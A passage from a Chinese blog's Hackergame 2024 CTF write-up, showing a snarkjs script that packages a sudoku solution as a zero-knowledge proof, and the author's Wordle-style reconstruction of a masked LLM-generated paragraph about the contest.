<h3 id="ZK-高手"><a href="#ZK-高手" class="headerlink" title="ZK 高手"></a>ZK 高手</h3><p>基本也是解出数独就行，不过需要打包成所谓的零知识证明的什么格式。</p>
<p>打包代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> snarkjs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"snarkjs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> input <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string-property property">"unsolved_grid"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token string-property property">"solved_grid"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">convertNumbersToStrings</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">row</span> <span class="token operator">=></span> row<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">num</span> <span class="token operator">=></span> num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

input<span class="token punctuation">.</span>unsolved_grid <span class="token operator">=</span> <span class="token function">convertNumbersToStrings</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>unsolved_grid<span class="token punctuation">)</span><span class="token punctuation">;</span>
input<span class="token punctuation">.</span>solved_grid <span class="token operator">=</span> <span class="token function">convertNumbersToStrings</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>solved_grid<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">generateProof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> proof<span class="token punctuation">,</span> publicSignals <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> snarkjs<span class="token punctuation">.</span>groth16<span class="token punctuation">.</span><span class="token function">fullProve</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token string">"attachment/sudoku.wasm"</span><span class="token punctuation">,</span> <span class="token string">"attachment/sudoku.zkey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'proof.json'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>proof<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Proof written to proof.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'public.json'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>publicSignals<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'public signals written to public.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">generateProof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error generating proof:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>把数独题目和解写到最上面的<code>input</code>变量里即可。</p>
<h2 id="先104🤣」"><a href="#先104🤣」" class="headerlink" title="先104🤣」"></a>先104🤣」</h2><p>(原题目名：先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」)</p>
<details class="toggle"><summary class="toggle-button">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote>
<p>以下内容包含 Human 辅助创作</p>
</blockquote>
<p>emmmmm 这次事件的背景大概如题所示。具体而言，在某位不幸群友转生成了 <a target="_blank" rel="noopener" href="https://modelscope.cn/models/qwen/Qwen2.5-3B-Instruct-GGUF">Qwen 2.5-3B</a>（还是 8-bit 量化的）后，毫无人道主义关怀的出题人们使用各种超越碳基生物（以及硅基生物）想象力的提示词对其进行了花样繁多的调戏。为了表达自己的不满，这位可怜的 LLM 只好锲而不舍地输出一些关于 Hackergame 的胡话。幸好 Hackergame 内容审查委员会提前部署了分级的内容审查系统（详见题目附件），比如把和 hackergame 相关的字符全部屏蔽成 <code>&#39;x&#39;</code> 了：</p>
<hr>
<p>In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.</p>
<hr>
<p>嘛说实话这个审查系统似乎确凿是强了些（虽然它没审查题目标题），所以如果你一定想阅读原文的话估计得自己想办法了。</p>
</div>
</div></details>
<h3 id="「行吧就算标题可以很长但是-flag-一定要短点」"><a href="#「行吧就算标题可以很长但是-flag-一定要短点」" class="headerlink" title="「行吧就算标题可以很长但是 flag 一定要短点」"></a>「行吧就算标题可以很长但是 flag 一定要短点」</h3><p>大语言模型生成一段关于Hackergame 2024的段落，然后把其中的<code>hackergame</code>里的字母全替换成了<code>x</code>。</p>
<p>文本：</p>
<pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>当Wordle来做，<del>我是Wordle大师。</del></p>
<p>轻松推出原文：</p>
<pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>第二问想到了可能要去搜这个模型的词典，然后写深搜来做，不过其他题太有意思了，就没去实现这个想法。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.fyz666.xyz">WindShadow</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.fyz666.xyz/blog/12196/">https://blog.fyz666.xyz/blog/12196/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.fyz666.xyz" target="_blank">逸风亭</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackergame/">Hackergame</a><a class="post-meta__tags" href="/tags/hackergame-2024/">Hackergame 2024</a></div><div class="post_share"><div class="addtoany"><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_button_telegram"></a><a class="a2a_button_qzone"></a><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_wechat"></a><a class="a2a_button_sina_weibo"></a><a class="a2a_button_facebook_messenger"></a><a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a></div></div><script async src="https://static.addtoany.com/menu/page.js"></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>觉得本文有用？V 我 50 看看实力！</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat_pay.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/wechat_pay.png" alt="V me 50!"></a><div class="post-qr-code-desc">V me 50!</div></li><li class="reward-item"><a href="/images/ali_pay.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/ali_pay.png" alt="Alipay is also ok~"></a><div class="post-qr-code-desc">Alipay is also ok~</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/blog/12168/" title="Hackergame 2024 题解（二）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp" onerror='onerror=null,src="/images/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hackergame 2024 题解（二）</div></div></a></div><div class="next-post pull-right"><a href="/blog/12239/" title="Python随机数的背后：MT19937算法之——算法分析"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/webp/4de41354-86bb-42e2-8812-9d13cd1c164b.webp" onerror='onerror=null,src="/images/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Python随机数的背后：MT19937算法之——算法分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/blog/12160/" title="Hackergame 2024 题解（一）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-09</div><div class="title">Hackergame 2024 题解（一）</div></div></a></div><div><a href="/blog/12168/" title="Hackergame 2024 题解（二）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-09</div><div class="title">Hackergame 2024 题解（二）</div></div></a></div><div><a href="/blog/12095/" title="Hackergame 2024 题解（零）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-09</div><div class="title">Hackergame 2024 题解（零）</div></div></a></div><div><a href="/blog/6797/" title="USTC Hackergame 2021部分题目Write-Up"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/png/735d7f0e-3060-42de-8196-de620e7b48e9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-30</div><div class="title">USTC Hackergame 2021部分题目Write-Up</div></div></a></div><div><a href="/blog/7999/" title="USTC Hackergame 2022小部分题目Write-Up"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/png/9aa6922d-5303-4713-a859-f1ac34b5a102.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">USTC Hackergame 2022小部分题目Write-Up</div></div></a></div><div><a href="/blog/8779/" title="Hackergame 2023题解（一）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/jpg/6f00f091-9b5b-42c9-aebd-6635e13518a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">Hackergame 2023题解（一）</div></div></a></div></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">Twikoo</span><span id="switch-btn"></span><span class="second-comment">Giscus</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/avatar.webp" onerror='this.onerror=null,this.src="/images/default-link.png"' alt="avatar"></div><div class="author-info__name">WindShadow</div><div class="author-info__description">行所欲行，无问西东。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">170</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">105</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/windshadow233"><i class="fab fa-github"></i><span>Catch me!</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:me@mail.fyz666.xyz" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://message/?uin=1010954322&amp;Site=fdfdf&amp;Menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/windshadow233" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://www.instagram.com/ericcc_fan/" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a><a class="social-icon" href="https://www.facebook.com/yizhan.fan.35" target="_blank" title="Facebook"><i class="fab fa-facebook-square"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB"><span class="toc-number">1.</span> <span class="toc-text">动画分享</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AA%E8%A6%81%E4%B8%8D%E5%81%9C%E4%B8%8B-HTTP-%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%93%8D%E5%BA%94%E5%B0%B1%E4%BC%9A%E4%B8%8D%E6%96%AD%E5%BB%B6%E4%BC%B8"><span class="toc-number">1.1.</span> <span class="toc-text">只要不停下 HTTP 服务，响应就会不断延伸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%8C%E6%9C%9B%E7%9A%84%E7%BB%88%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%99%A8%EF%BC%8C%E8%BF%9E%E6%8E%A5%E7%9D%80%E6%88%91%E4%BB%AC%E7%9A%84%E7%BE%81%E7%BB%8A"><span class="toc-number">1.2.</span> <span class="toc-text">希望的终端模拟器，连接着我们的羁绊</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E7%81%AF"><span class="toc-number">2.</span> <span class="toc-text">关灯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-amp-Medium-amp-Hard"><span class="toc-number">2.1.</span> <span class="toc-text">Easy &amp; Medium &amp; Hard</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%86%85%E5%8D%B7"><span class="toc-number">3.</span> <span class="toc-text">禁止内卷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%B8%89%E7%A2%B0%E6%92%9E"><span class="toc-number">4.</span> <span class="toc-text">哈希三碰撞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A2%B0%E6%92%9E%E4%B9%8B%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">三碰撞之一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%B6%E7%9F%A5%E8%AF%86%E6%95%B0%E7%8B%AC"><span class="toc-number">5.</span> <span class="toc-text">零知识数独</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%8B%AC%E9%AB%98%E6%89%8B"><span class="toc-number">5.1.</span> <span class="toc-text">数独高手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZK-%E9%AB%98%E6%89%8B"><span class="toc-number">5.2.</span> <span class="toc-text">ZK 高手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88104%F0%9F%A4%A3%E3%80%8D"><span class="toc-number">6.</span> <span class="toc-text">先104🤣」</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%8C%E8%A1%8C%E5%90%A7%E5%B0%B1%E7%AE%97%E6%A0%87%E9%A2%98%E5%8F%AF%E4%BB%A5%E5%BE%88%E9%95%BF%E4%BD%86%E6%98%AF-flag-%E4%B8%80%E5%AE%9A%E8%A6%81%E7%9F%AD%E7%82%B9%E3%80%8D"><span class="toc-number">6.1.</span> <span class="toc-text">「行吧就算标题可以很长但是 flag 一定要短点」</span></a></li></ol></li></ol></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>最新评论(仅 Twikoo)</span></div><div class="aside-list"><span>正在加载中...</span></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">07 月 2025</span><span class="card-archive-list-count">3 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">06 月 2025</span><span class="card-archive-list-count">6 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">05 月 2025</span><span class="card-archive-list-count">1 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">04 月 2025</span><span class="card-archive-list-count">1 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">11 月 2024</span><span class="card-archive-list-count">9 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">10 月 2024</span><span class="card-archive-list-count">5 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">05 月 2024</span><span class="card-archive-list-count">8 篇</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">04 月 2024</span><span class="card-archive-list-count">8 篇</span></a></li></ul></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item"><a class="card-category-list-link" href="/categories/ctf%E9%A2%98%E8%A7%A3/"><span class="card-category-list-name">CTF题解</span><span class="card-category-list-count">19</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/debug/"><span class="card-category-list-name">Debug</span><span class="card-category-list-count">20</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/hexo%E9%AD%94%E6%94%B9/"><span class="card-category-list-name">Hexo魔改</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/"><span class="card-category-list-name">博客相关</span><span class="card-category-list-count">39</span></a></li><li class="card-category-list-item"><a class="card-category-list-link" href="/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"><span class="card-category-list-name">大语言模型训练</span><span class="card-category-list-count">8</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><details id="tags-det"><summary>展开</summary><div class="card-tag-cloud">
    <div id="cloud-tags" data-tags='[{"name":"JavaScript","path":"/tags/javascript/","length":11},{"name":"Web前端","path":"/tags/web%E5%89%8D%E7%AB%AF/","length":14},{"name":"Docker","path":"/tags/docker/","length":10},{"name":"LaTeX","path":"/tags/latex/","length":2},{"name":"Linux","path":"/tags/linux/","length":21},{"name":"ShareLaTeX","path":"/tags/sharelatex/","length":2},{"name":"Django","path":"/tags/django/","length":8},{"name":"Python","path":"/tags/python/","length":33},{"name":"数据库","path":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/","length":4},{"name":"WordPress","path":"/tags/wordpress/","length":21},{"name":"PHP","path":"/tags/php/","length":9},{"name":"Email","path":"/tags/email/","length":3},{"name":"爬虫","path":"/tags/%E7%88%AC%E8%99%AB/","length":8},{"name":"Nginx","path":"/tags/nginx/","length":5},{"name":"uWSGI","path":"/tags/uwsgi/","length":1},{"name":"Apache","path":"/tags/apache/","length":2},{"name":"SSL","path":"/tags/ssl/","length":5},{"name":"CORS","path":"/tags/cors/","length":2},{"name":"WSL","path":"/tags/wsl/","length":3},{"name":"SSH","path":"/tags/ssh/","length":4},{"name":"MySQL","path":"/tags/mysql/","length":1},{"name":"RSA","path":"/tags/rsa/","length":2},{"name":"密码学","path":"/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/","length":7},{"name":"数论","path":"/tags/%E6%95%B0%E8%AE%BA/","length":2},{"name":"Windows","path":"/tags/windows/","length":1},{"name":"Cookie","path":"/tags/cookie/","length":1},{"name":"CDN","path":"/tags/cdn/","length":1},{"name":"CSS","path":"/tags/css/","length":1},{"name":"Jupyter Notebook","path":"/tags/jupyter-notebook/","length":1},{"name":"npm","path":"/tags/npm/","length":5},{"name":"Vue","path":"/tags/vue/","length":2},{"name":"Webpack","path":"/tags/webpack/","length":2},{"name":"NodeJS","path":"/tags/nodejs/","length":8},{"name":"Web后端","path":"/tags/web%E5%90%8E%E7%AB%AF/","length":2},{"name":"Oauth","path":"/tags/oauth/","length":3},{"name":"前端","path":"/tags/%E5%89%8D%E7%AB%AF/","length":1},{"name":"神经网络","path":"/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","length":16},{"name":"机器学习","path":"/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/","length":27},{"name":"深度学习","path":"/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/","length":27},{"name":"Boost","path":"/tags/boost/","length":1},{"name":"C++","path":"/tags/c/","length":2},{"name":"Ubuntu","path":"/tags/ubuntu/","length":4},{"name":"IPv6","path":"/tags/ipv6/","length":4},{"name":"OpenWrt","path":"/tags/openwrt/","length":8},{"name":"计网","path":"/tags/%E8%AE%A1%E7%BD%91/","length":11},{"name":"路由器","path":"/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/","length":5},{"name":"V2Ray","path":"/tags/v2ray/","length":3},{"name":"内网穿透","path":"/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","length":2},{"name":"DNS","path":"/tags/dns/","length":3},{"name":"树莓派","path":"/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/","length":4},{"name":"科学上网","path":"/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/","length":2},{"name":"Samba","path":"/tags/samba/","length":2},{"name":"Shadowrocket","path":"/tags/shadowrocket/","length":1},{"name":"反向传播","path":"/tags/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/","length":8},{"name":"CQHTTP","path":"/tags/cqhttp/","length":1},{"name":"nonebot","path":"/tags/nonebot/","length":1},{"name":"QQ bot","path":"/tags/qq-bot/","length":1},{"name":"卷积神经网络","path":"/tags/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","length":6},{"name":"SGD","path":"/tags/sgd/","length":1},{"name":"Hackergame","path":"/tags/hackergame/","length":10},{"name":"Hackergame 2021","path":"/tags/hackergame-2021/","length":1},{"name":"GeekGame","path":"/tags/geekgame/","length":9},{"name":"GeekGame 1st","path":"/tags/geekgame-1st/","length":1},{"name":"反向代理","path":"/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/","length":3},{"name":"ZeroTier","path":"/tags/zerotier/","length":2},{"name":"Hackergame 2022","path":"/tags/hackergame-2022/","length":1},{"name":"GeekGame 2nd","path":"/tags/geekgame-2nd/","length":1},{"name":"Mahjong AI","path":"/tags/mahjong-ai/","length":3},{"name":"Suphx","path":"/tags/suphx/","length":3},{"name":"GeekGame 3rd","path":"/tags/geekgame-3rd/","length":3},{"name":"Hackergame 2023","path":"/tags/hackergame-2023/","length":4},{"name":"API GateWay","path":"/tags/api-gateway/","length":1},{"name":"AWS Lambda","path":"/tags/aws-lambda/","length":1},{"name":"GitHub API","path":"/tags/github-api/","length":3},{"name":"Webhook","path":"/tags/webhook/","length":1},{"name":"Cloudflare","path":"/tags/cloudflare/","length":1},{"name":"防火墙","path":"/tags/%E9%98%B2%E7%81%AB%E5%A2%99/","length":1},{"name":"Gitalk","path":"/tags/gitalk/","length":2},{"name":"Bitwarden","path":"/tags/bitwarden/","length":1},{"name":"DNS over 